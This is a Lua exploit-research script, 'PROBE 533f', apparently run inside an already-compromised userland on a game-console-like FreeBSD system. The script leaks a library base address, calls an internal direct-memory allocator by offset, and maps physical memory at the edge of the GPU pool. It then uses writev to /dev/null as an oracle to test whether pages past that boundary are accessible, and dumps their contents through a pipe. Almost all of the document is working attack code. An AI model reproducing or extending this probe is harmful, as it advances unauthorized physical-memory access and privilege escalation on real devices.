-- CRASH_CLASS: MODERATE
-- PROBE 533f: Pager boundary test v2 (fixed /dev/null open)
--
-- 533e had null_fd=-1 because the path string was wrong.
-- Fix: use proper byte-by-byte string construction.
-- Test: does pager extend past GPU pool boundary (0x150000000)?

print("=== PROBE 533f: PAGER BOUNDARY V2 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        local val = b0 + b1 * 256 + b2 * 65536 + b3 * 16777216
        wd(buf + (i - 1), val)
    end
end

local sc_mmap = make_syscall(477)
local sc_writev = make_syscall(121)
local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_pipe2 = make_syscall(542)
local sc_read = make_syscall(3)

local lk = uint64(0)
do
    local info = memory.alloc(0x200)
    zero(info, 0x200); wd(info, 0x160)
    pcall(function() make_syscall(593)(uint64(0x2001), info) end)
    lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
end
print("lk=" .. q(lk))

local alloc_fn = lk + uint64(0x17EF0)

-- Open /dev/null properly
local path_buf = memory.alloc(16)
zero(path_buf, 16)
write_string(path_buf, "/dev/null\0")
local ok_o, null_fd = pcall(function()
    return sc_open(uint64(path_buf), uint64(2), uint64(0))
end)
null_fd = to_num(null_fd)
print("null_fd=" .. null_fd)
if null_fd < 0 then
    -- Fallback: try O_RDONLY
    ok_o, null_fd = pcall(function()
        return sc_open(uint64(path_buf), uint64(0), uint64(0))
    end)
    null_fd = to_num(null_fd)
    print("null_fd(rdonly)=" .. null_fd)
end
if null_fd < 0 then
    -- Fallback: use write to a pipe
    print("Fallback: using pipe instead of /dev/null")
    local pipe_buf = memory.alloc(8)
    zero(pipe_buf, 8)
    pcall(function() sc_pipe2(uint64(pipe_buf), uint64(0)) end)
    local pipe_r = rd(pipe_buf)
    local pipe_w = rd(pipe_buf + 4)
    null_fd = pipe_w or -1
    print("pipe_w=" .. null_fd)
    -- We'll need to drain the pipe periodically
end

if null_fd < 0 then
    print("ERROR: no valid fd for writev probe")
    print("=== 533f DONE ===")
    return
end

-- Allocate at pool end
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64("0x14FFC0000"), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
local phys_n = to_num(phys)
print("phys=" .. q(phys))

local pool_end = 0x150000000
local pages_to_end = math.floor((pool_end - phys_n) / 0x4000)
print("pages_to_end=" .. pages_to_end)

-- Map with mmap_dmem(628)
local sc_628 = make_syscall(628)
local ok_m, map_va = pcall(function()
    return sc_628(uint64(0), uint64(0x4000), uint64(-1),
        uint64(3), uint64(0), phys)
end)
local map_va_n = to_num(map_va)
if not ok_m or map_va_n == 0 or map_va_n == 0xFFFFFFFF then
    print("mmap_dmem FAILED: " .. q(map_va))
    print("=== 533f DONE ===")
    return
end
print("VA=" .. q(map_va))

-- Verify: write/read the allocated page first
wd(map_va_n, 0xCAFEBABE)
local readback = rd(map_va_n)
print("verify: wrote 0xCAFEBABE read=" .. string.format("0x%X", readback < 0 and readback + 0x100000000 or readback))

-- [A] writev probe: pages 0 through 48
print("")
print("[A] writev probe (0-48 pages)")
print("  pool_boundary at page " .. pages_to_end)

local iov = memory.alloc(16)
local page_size = 0x4000
local last_valid = -1
local consec_fail = 0

for pg = 0, 48 do
    local test_addr = map_va + uint64(pg * page_size)
    wq(iov, test_addr)
    wq(iov + 8, uint64(16))

    local ok_w, rv = pcall(function()
        return sc_writev(uint64(null_fd), uint64(iov), uint64(1))
    end)
    local rvn = ok_w and to_num(rv) or -999

    local marker = ""
    if pg == pages_to_end then marker = " <<<< POOL BOUNDARY" end

    local phys_est = phys_n + pg * page_size
    local status
    if rvn == 16 then
        status = "VALID"
        last_valid = pg
        consec_fail = 0
    elseif rvn == -1 then
        status = "EFAULT"
        consec_fail = consec_fail + 1
    else
        status = string.format("rv=%d", rvn)
        consec_fail = consec_fail + 1
    end

    print(string.format("  pg %02d (phys~0x%X): %s%s", pg, phys_est, status, marker))

    if consec_fail >= 4 and pg > pages_to_end then
        print("  (stopping: 4 consecutive EFAULT past boundary)")
        break
    end
end

print("")
print("last_valid=" .. last_valid .. " pages_to_end=" .. pages_to_end)

-- [B] Read content of valid pages near/past boundary via pipe
if last_valid >= pages_to_end - 1 then
    print("")
    print("[B] READ near-boundary pages")
    local pbuf = memory.alloc(8)
    zero(pbuf, 8)
    pcall(function() sc_pipe2(uint64(pbuf), uint64(0)) end)
    local pr = rd(pbuf)
    local pw = rd(pbuf + 4)

    if pr and pw and pr > 0 and pw > 0 then
        local start_pg = math.max(0, pages_to_end - 2)
        local end_pg = math.min(last_valid, pages_to_end + 4)
        for pg = start_pg, end_pg do
            local ta = map_va + uint64(pg * page_size)
            wq(iov, ta)
            wq(iov + 8, uint64(64))
            local ok_wv, wrv = pcall(function()
                return sc_writev(uint64(pw), uint64(iov), uint64(1))
            end)
            if ok_wv and to_num(wrv) == 64 then
                local rbuf = memory.alloc(64)
                zero(rbuf, 64)
                pcall(function() sc_read(uint64(pr), uint64(rbuf), uint64(64)) end)
                local hex = ""
                for off = 0, 60, 4 do
                    local d = rd(rbuf + off)
                    if d then
                        if d < 0 then d = d + 0x100000000 end
                        hex = hex .. string.format("%08X ", d)
                    end
                end
                local pest = phys_n + pg * page_size
                local bm = pest >= pool_end and " PAST_POOL" or ""
                print(string.format("  pg %02d (0x%X)%s: %s", pg, pest, bm, hex))
            end
        end
        pcall(function() sc_close(uint64(pr)) end)
        pcall(function() sc_close(uint64(pw)) end)
    end
end

pcall(function() sc_close(uint64(null_fd)) end)
print("")
print("=== 533f DONE ===")
